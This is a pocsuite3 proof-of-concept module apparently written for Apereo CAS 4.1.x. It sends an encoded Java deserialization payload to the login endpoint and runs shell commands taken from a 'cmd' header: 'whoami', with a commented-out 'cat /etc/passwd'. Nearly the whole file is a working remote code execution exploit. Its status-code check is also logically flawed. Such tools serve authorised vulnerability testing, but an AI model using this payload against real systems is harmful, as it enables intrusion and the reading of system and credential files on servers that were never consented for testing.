"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['ajatar']
    vulDate = '2016'
    createDate = '2020-10-13'
    updateDate = '2020-10-13'
    references = ['https://www.anquanke.com/post/id/198842#h2-5']
    name = 'Apereo Cas 4.1.x 反序列化'
    appPowerLink = 'Apereo Cas 4.1.x 反序列化'
    appName = 'apereo cas'
    appVersion = 'versions 4.1.x'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Apereo Cas 4.1.x 反序列化'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''读取目标/etc/passwd'''


    def _verify(self):
        result = {}
        if '/' == self.url[-1]:
            url = self.url
        else:
            url = self.url + '/'
        url = url + 'login'
        proxies = {"http":"127.0.0.1:8088","https":"127.0.0.1:8088"}
        #headers = {'cmd': 'cat /etc/passwd','Content-Type': 'application/x-www-form-urlencoded'}
        headers = {'cmd': 'whoami', 'Content-Type': 'application/x-www-form-urlencoded'}
        payload = "lt=LT-29-qCSocRQAnyEtjwyROdZNbsPBBteJhQ-cas01.example.org&execution=a6d28202-9907-4fae-bb80-7fa975dd7180_AAAAIgAAABATC0YoY6tDNToKz%2Fzv2ZsnAAAABmFlczEyOJm99EiFos4G0EIfoQHL8BK0sq2kAjdcNoe2qPpgmtcylyCUBn8%2B%2FOJ8muvPjWW11ZQB2AZszYscocpyLnkQWnFtcKb37N82FQmSOg6sHcr13aGb1v0fmih0nOggnU8exQO8YXcEjj7ewOihRqByuwe9%2Ft6buLN3%2F8P2VoU78OIIuM%2BjfZLZVMt1DYdUi%2Bto3bi2uAFeADDguTNi0zsf3l%2BBcd%2B%2FEFb%2FqvfaCXS6kEOJdumpeLJV5V5VVV7kW5xwKtIX0Tgyge0VLbi%2BrehiBJkhJLyIZCKwbRoiceQNtX9HFlKG8gEYmclpZz9lHuQuIgKOJ4Lm5lAb7x1XxVWfitpdHDVfZADOC6u%2BH%2FCV89fDqDbtzVLois1q9imQiWLu%2F3rEVZDWJ%2FbFVz5miF0aXBbk3yCEi4E6rZyUtWAKs7mD2OQWOWKDUTk2wYJS7%2FJgxAs8xE3%2F%2BJlMTPUzpaAb9QxRGgSGGzw0TIfSw5qN9W9p3dczT3ipdtP6%2BP5BIBm1oLSrKzTAOAt3Zh83cFRhp7VZHA434qvmqw0uKYxl9YChil6zMkCc8uKJdbmSIy4IE0c0s%2BMvDB1fXCOUfO1PyMWMinSiWlEOfNQ%2BdyIGw87sTZHFpYJ29eL9SaDVbF9OZ%2FiH8G7HxLN2NjSW%2BZ7Wm3r7ObZ8BmTFC00trQD0Nz%2BDGU6fkNzXltIaaf224LlAmj2dCdSfCZwnemdpmpHaoBBxGm%2Bgzm%2B3B8px6UrT3QdiB9OOUg5%2FntZaobGkTaeOGRkfCuDurY7ndsbuedy1AJYiUl1%2B867HLocaC0SA9Oyh0lHdmvvFA4JaMR1rISqAI8GTBZ8irZMhW717MelXS4Iu6p%2F1BskNDLUZoTk7afk%2F6MXOGc0vwCfOijs4OY6%2FBK4WItBnUbAm8zFGTZFpe9%2FBC2c9akGa9gtTJ6k5dytNp8lqpQyXrwinmpQNN86VrcweE9HneBt%2FuLEil4VJ0ZPFWd3OU9HVEyFUQLlJIZqR9YM5N7gTsaaiMUFz9uD4VEeIsbuqKJS1KEPdM49mDzOM5Dw0XzuwPRseGbt%2FbJkm1EClFyf%2Fy%2Be61RcArp4dJbYGuyHiJJ0VED1ExuAzChsRD7fQptRB%2FaAXp3Qpp%2BbReUwxyP8RzK65BnQMh7XpoT3bHQAfqaKYMNA5dklxySWMwH2pFCEvSrlyAyd2eMf51lHzzXW0sFDPkLHply6IUa4pLu2e8EOT77HsUTBfJeUR0mGuziiTGIGo1STBAL6X%2Ff%2BH8fL5YzuLRF61VnqHon6YQkC1im7ocCOBKfVdHSQoFa8tlYjE8SwGLvDDH0yirshEcfEsXdYABEyi35hi9Dr6gO5p7qWV3iBcV5UnCWHHaoGSwM0yqYG6rBCqCn2NYeeButlbD9e4VUVnnwfWOD5oEcvXsIJ%2BzAMwT3TRhfG%2BqmdZSAE%2FFSKwfWBA4E0XkySqNfxzl7zfZBWAWqZg2QVz%2BoUAxnck4UDdUJD6TftzxkaprXKxOGlk1RVKIq1hDb3a184ic%2FHc78N65FrpsmV7ZHCmcfaUQJxlRp%2FRaLlt9mJnYDDk0r4hbyeBnHhYVNbNSfAqpp7EH3QNisk5D%2BR2wEg5SjepsI%2BGM541FTMByV1BGn4t9wkiELnT%2BTOOzSKR8kyFbPkJTMD1UgiUVmVEXnmfGUSsQPRK26djMjvWeXwSCFc0oY7SQ6MgOX4jdzyBwTzr3grrwmSOf9Ts8QSnY%2FJE1EaVHnnWHel1WBxj%2Bejkd88rQCLlvQAKg05sCLjMBPPm6FwIM52h1Rfqs5UUBJtnVs4K7PeUJmNi0lUkDZinSM2RzV1w7yld6SRsWYFP8Swr%2BDJmxBcvM2OOeVD2xv1i2EnksVCeAbGaXyZpBuvbPsaMPOHZu9jLN2%2BTCwBghUDpNx8j9yg3LmFZvTFoxsjePY8GUCJKuZJn%2B8RmWt5WTzeM5gctT6K3f0ol09MXombLSLaEsXMsEgIE%2FuEo5Q4bOFZhY21v7GEwghbbHIr%2BSGzcb1%2BILbrUA7LaNbCtlIWz26YT3wvmEYmjxjdGS5SG%2FHoz8ogZi110wPCCQWl9SRdSk4CAn1luEk6Fn51OTvtYKELa6aUfSj3Z4giYnl0DSZWTifhd%2FJzEQDWV%2FXP4dWuVIAElEyQcDQUAib0MLjdXJddM4sysmW6%2BAjQcqTlBdW8dwtOPou2i8xhODCtUkn5f4wJbJOFaymXv%2Byk6edVYGLHBzVKyGB3wwA7g4N6Epg%2B2BzT1muJthuEO8Kt7In%2FXfuoFqaUVchmsQXkHURFvUSEFhxNi7%2FQsCyI4VE3x%2Fk5olbmNpSTNY7XnSxxs5VBmQ1Kx1npOn6nOS1Ug%2FauSm06WB5wuhADQngA%2FhEiW0zt%2FvF51tU5m5BCyu%2Bl0%2BT2z82as7mQGROu2kxOSPsPa6g8LwZeoBis%2BPEuKbfqaRKWZCONqTzfefUAd4MX7z8muvnAWnyHK1XJPPdhlrzNCVQi9TzsTFgu%2FCSeXq2AC6H0YH2MzcuIFWBDzG1NRsvYItL3LjT3zrQZC2imvE9lrsIQLouceKl4o%2BkmYLx0W%2FZPzIG3LrJF29LOmay4sLPhwU9ST9dYjLfAsVzQqff3RNAeofxWEf7u5bJ3OLrK5G1OW3z9%2B8icnxalwmnRkhwLXNfLfiWcT%2Bi1ng969dRvcTTFQqzIG%2F6dcCWmZDyfd1uwA0vbx9khuieNeMqc3nr2OQcjxJqcjhS4fM3nCDuYznaSIxZSBIDMvKDhfA6rv8MrOjhSwl6VkaJM%3D"
        r = requests.post(url,data=payload,headers=headers,proxies=proxies)
        if  200 >= r.status_code and  r.status_code <=300  and "<!DOCTYPE html>" not in r.text: #and
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Postdata'] = payload
            result['AdminInfo'] = r.text

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
